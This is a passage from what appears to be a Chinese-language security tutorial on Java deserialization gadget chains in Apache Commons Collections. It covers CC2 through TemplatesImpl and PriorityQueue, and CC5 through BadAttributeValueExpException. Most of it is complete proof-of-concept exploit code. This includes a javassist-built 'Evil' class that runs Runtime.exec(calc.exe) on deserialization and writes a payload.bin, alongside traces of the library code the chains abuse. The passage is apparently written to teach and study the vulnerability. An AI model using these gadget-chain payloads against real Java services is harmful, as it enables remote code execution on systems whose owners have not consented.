        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        <span class="hljs-comment">// &#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x6570;&#x7EC4;</span>
        Object[] queueArray = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;queue&#x503C;</span>
        Field queueField = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);
        queueField.setAccessible(<span class="hljs-keyword">true</span>);
        queueField.set(priorityQueue, queueArray);
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;size&#x503C;</span>
        Field queueSize = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);
        queueSize.setAccessible(<span class="hljs-keyword">true</span>);
        queueSize.set(priorityQueue, <span class="hljs-number">2</span>);
        <span class="hljs-comment">// &#x53CD;&#x5C04;&#x8BBE;&#x7F6E;PriorityQueue&#x7684;comparator&#x503C;</span>
        Field queueComparator = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);
        queueComparator.setAccessible(<span class="hljs-keyword">true</span>);
        queueComparator.set(priorityQueue, transformingComparator);

        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(priorityQueue);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h4 id="&#x1F6A9;&#x5BF9;tfacroty&#x7684;&#x518D;&#x6B21;&#x7406;&#x89E3;">&#x1F6A9;&#x5BF9;_tfacroty&#x7684;&#x518D;&#x6B21;&#x7406;&#x89E3;</h4>
<p>&#x7814;&#x7A76;&#x5230;jackson&#x7684;&#x89E6;&#x53D1;&#x95EE;&#x9898;&#x518D;&#x56DE;&#x6765;&#x770B;&#x8FD9;&#x4E2A;<code>_tfactory</code>&#x7684;&#x4F5C;&#x7528;, jdk1.7&#x4E0B;&#x8BE5;&#x5C5E;&#x6027;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x7684;, &#x800C;jdk1.8&#x4E0B;&#x771F;&#x5B9E;&#x5B58;&#x5728;&#x6B64;&#x5C5E;&#x6027;(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses)</p>
<p><img src="img/1642578989136.png" alt="1642578989136"></p>
<p>&#x81F3;&#x4E8E;CommonCollections&#x94FE;&#x4E0B;&#x6709;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x6B64;&#x7C7B;&#x7684;&#x539F;&#x56E0;, &#x662F;&#x56E0;&#x4E3A;&#x901A;&#x8FC7;<code>proprityQueue</code>&#x7C7B;&#x901A;&#x8FC7;field&#x65B9;&#x5F0F;&#x6DFB;&#x52A0;&#x503C;&#x65F6;&#x5176;<code>_tfactory</code>&#x6700;&#x7EC8;&#x4F1A;&#x81EA;&#x5DF1;&#x8D4B;&#x503C;&#x4E3A;<code>TransformerFactoryImpl</code>&#x5B9E;&#x4F8B;</p>
<blockquote>
<p>&#x5728;Java&#x4E2D;&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B9E;&#x73B0;&#x4E24;&#x79CD;&#x63A5;&#x53E3;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x82E5;&#x5B9E;&#x73B0;&#x7684;&#x662F;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x5219;&#x6240;&#x6709;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5C06;&#x4F1A;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#xFF0C;&#x82E5;&#x5B9E;&#x73B0;&#x7684;&#x662F;Externalizable&#x63A5;&#x53E3;&#xFF0C;&#x5219;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4E1C;&#x897F;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x9700;&#x8981;&#x5728;writeExternal&#x65B9;&#x6CD5;&#x4E2D;&#x8FDB;&#x884C;&#x624B;&#x5DE5;&#x6307;&#x5B9A;&#x6240;&#x8981;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x8FD9;&#x4E0E;&#x662F;&#x5426;&#x88AB;transient&#x4FEE;&#x9970;&#x65E0;&#x5173; </p>
</blockquote>
<p>&#x8BE6;&#x7EC6;&#x53EF;&#x53C2;&#x8003;: <a href="https://www.cnblogs.com/lanxuezaipiao/p/3369962.html" target="_blank">https://www.cnblogs.com/lanxuezaipiao/p/3369962.html</a></p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream is)</span>
      <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException
    </span>{
        SecurityManager security = System.getSecurityManager();
        <span class="hljs-keyword">if</span> (security != <span class="hljs-keyword">null</span>){
            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);
            <span class="hljs-keyword">if</span> (temp == <span class="hljs-keyword">null</span> || !(temp.length()==<span class="hljs-number">0</span> || temp.equalsIgnoreCase(<span class="hljs-string">&quot;true&quot;</span>))) {
                ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UnsupportedOperationException(err.toString());
            }
        }

        <span class="hljs-comment">// We have to read serialized fields first.</span>
        ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get(<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-keyword">null</span>);
        _bytecodes = (<span class="hljs-keyword">byte</span>[][])gf.get(<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">null</span>);
        _class = (Class[])gf.get(<span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        _transletIndex = gf.get(<span class="hljs-string">&quot;_transletIndex&quot;</span>, -<span class="hljs-number">1</span>);

        _outputProperties = (Properties)gf.get(<span class="hljs-string">&quot;_outputProperties&quot;</span>, <span class="hljs-keyword">null</span>);
        _indentNumber = gf.get(<span class="hljs-string">&quot;_indentNumber&quot;</span>, <span class="hljs-number">0</span>);

        <span class="hljs-keyword">if</span> (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }
        <span class="hljs-comment">// &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x7ED9;_tfactory&#x8D4B;&#x503C;TransformerFactoryImpl&#x5BF9;&#x8C61;</span>
        _tfactory = <span class="hljs-keyword">new</span> TransformerFactoryImpl();
    }
</code></pre>
<p>&#x800C;&#x901A;&#x8FC7;&#x4E00;&#x4E0B;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8D4B;&#x503C;&#x5219;&#x4F1A;&#x63D0;&#x524D;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x8FDB;&#x5165;compare&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>, transformingComparator);
<span class="hljs-comment">// &#x901A;&#x8FC7;add&#x5EFA;&#x7ACB;size&#x4E3A;2&#x7684;&#x6570;&#x7EC4;</span>
priorityQueue.add(templates);priorityQueue.add(templates);
</code></pre>
<p>&#x8DDF;&#x8FDB;priorityQueue&#x7684;&#x65B9;&#x6CD5;: add &gt; offer &gt; siftUp</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftUp</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>{
        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)
            siftUpUsingComparator(k, x);
        <span class="hljs-keyword">else</span>
            siftUpComparable(k, x);
    }
</code></pre>
<p>&#x8FD9;&#x91CC;&#x4F1A;&#x53BB;&#x5224;&#x65AD;comparator&#x662F;&#x5426;&#x4E3A;&#x7A7A;, &#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x5165;&#x4E86;, &#x6240;&#x4EE5;&#x8DDF;&#x8FDB;siftUpUsingComparator&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftUpUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>{
        <span class="hljs-keyword">while</span> (k &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">int</span> parent = (k - <span class="hljs-number">1</span>) &gt;&gt;&gt; <span class="hljs-number">1</span>;
            Object e = queue[parent];
            <span class="hljs-comment">// &#x5E8F;&#x5217;&#x5316;&#x65F6;&#x63D0;&#x524D;&#x89E6;&#x53D1;&#x4E86;compare&#x65B9;&#x6CD5;</span>
            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="hljs-number">0</span>)
                <span class="hljs-keyword">break</span>;
            queue[k] = e;
            k = parent;
        }
        queue[k] = x;
    }
</code></pre>
<p>&#x8FD9;&#x5C31;&#x5BFC;&#x81F4;&#x8FD8;&#x672A;&#x7ECF;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x5728;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x56E0;&#x4E3A;<code>_tfactory</code>&#x6CA1;&#x6709;&#x8D4B;&#x503C;, &#x62A5;&#x9519;&#x9000;&#x51FA;, &#x540E;&#x7EED;&#x7684;&#x4E5F;&#x4E0D;&#x4F1A;&#x6267;&#x884C;, &#x5982;&#x679C;&#x63D0;&#x524D;&#x8D4B;&#x503C;&#x7684;&#x8BDD;&#x76F8;&#x5F53;&#x4E8E;&#x76F4;&#x63A5;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x89E6;&#x53D1;&#x4E86;&#x7ED3;&#x679C;, &#x6240;&#x4EE5;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x65E0;&#x5BB3;&#x7684;InvokerTransformer&#x65B9;&#x6CD5;, &#x7B49;&#x5E8F;&#x5217;&#x5316;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x901A;&#x8FC7;&#x4F5C;&#x7528;&#x57DF;&#x4FEE;&#x6539;, &#x8FD9;&#x4E5F;&#x662F;CommonsCollection2&#x7684;&#x53E6;&#x4E00;&#x79CD;&#x5199;&#x6CD5;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
<span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;

<span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections2</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;&#x65E0;&#x5BB3;&#x7684;InvokerTransformer</span>
        InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;TransformingComparator&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x4E14;&#x4F20;&#x5165;&#x4E86;invokerTransformer&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;TransformingComparator&#x4E2D;&#x7684;compare&#x65B9;&#x6CD5;</span>
        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(invokerTransformer);
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;PriorityQueue&#x5BF9;&#x8C61;</span>
        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>, transformingComparator);
        <span class="hljs-comment">// &#x901A;&#x8FC7;add&#x5EFA;&#x7ACB;size&#x4E3A;2&#x7684;&#x6570;&#x7EC4;</span>
        priorityQueue.add(templates);priorityQueue.add(templates);
        <span class="hljs-comment">// &#x4FEE;&#x6539;&#x4F5C;&#x7528;&#x57DF;&#x4F7F;&#x5176;&#x53EF;&#x89E6;&#x53D1;</span>
        setFieldValue(invokerTransformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);
        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(priorityQueue);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h2 id="cc5badattributevalueexpexception">CC5_BadAttributeValueExpException</h2>
<p>&#x9002;&#x7528;&#x7248;&#x672C;&#xFF1A;3.1-3.2.1&#xFF0C;jdk1.8 </p>
<p>CC1&#x4E86;&#x89E3;&#x4E86;CC5&#x5C31;&#x4E0D;&#x4F1A;&#x7279;&#x522B;&#x96BE;, &#x4E3B;&#x8981;&#x662F;&#x9488;&#x5BF9;jdk1.8&#x4E4B;&#x540E;AnnotationInvocationHandler&#x79FB;&#x9664;memberValue.setValue&#x5BFC;&#x81F4;&#x94FE;&#x5B50;&#x5931;&#x6548;&#x800C;&#x91C7;&#x53D6;&#x7684;BadAttributeValueExpException&#x8FDB;&#x884C;LazyMap&#x7684;get&#x8C03;&#x7528;, &#x66F4;&#x6539;&#x7684;&#x6B65;&#x9AA4;&#x4E3B;&#x8981;&#x5982;&#x4E0B;:</p>
<pre><code>BadAttributeValueException.readObject -&gt;
TiedMapEntry.toString -&gt;
TiedMapEntry.getValue -&gt;
(this.map.get)LazyMap.get -&gt;
ChainedTransformer.transform
</code></pre><p>jdk1.8&#x4E2D;BadAttributeValueExpException&#x91CD;&#x5199;&#x4E86;readObject&#x65B9;&#x6CD5;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>{
        ObjectInputStream.GetField gf = ois.readFields();
        <span class="hljs-comment">// val&#x7684;&#x503C;&#x8D4B;&#x7ED9;valObj</span>
        Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);

        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) {
            val = <span class="hljs-keyword">null</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) {
            val= valObj;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span>
                || valObj <span class="hljs-keyword">instanceof</span> Long
                || valObj <span class="hljs-keyword">instanceof</span> Integer
                || valObj <span class="hljs-keyword">instanceof</span> Float
                || valObj <span class="hljs-keyword">instanceof</span> Double
                || valObj <span class="hljs-keyword">instanceof</span> Byte
                || valObj <span class="hljs-keyword">instanceof</span> Short
                || valObj <span class="hljs-keyword">instanceof</span> Boolean) {
            <span class="hljs-comment">// valObj&#x4E3A;TiedMapEntry, &#x5373;&#x8C03;&#x7528;TiedMapEntry.toString</span>
            val = valObj.toString();
        } <span class="hljs-keyword">else</span> { <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span>
            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();
        }
    }
</code></pre>
<p>&#x8DDF;&#x8FDB;TiedMapEntry.toString</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// &#x8DDF;&#x8FDB;getValue&#x65B9;&#x6CD5;</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getKey() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-keyword">this</span>.getValue();
    }
...
    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// this.map&#x8D4B;&#x503C;&#x4E3A;LazyMap, &#x8C03;&#x7528;LazyMap.get</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.get(<span class="hljs-keyword">this</span>.key);
    }
</code></pre>
<p>&#x8DDF;&#x8FDB;LazyMap.get</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">super</span>.map.containsKey(key)) {
            <span class="hljs-comment">// &#x6B64;&#x5904;key&#x8D4B;&#x503C;&#x4E3A;ChainTransformer&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;</span>
            Object value = <span class="hljs-keyword">this</span>.factory.transform(key);
            <span class="hljs-keyword">super</span>.map.put(key, value);
            <span class="hljs-keyword">return</span> value;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.map.get(key);
        }
    }
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5_BadAttributeValueExpException</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
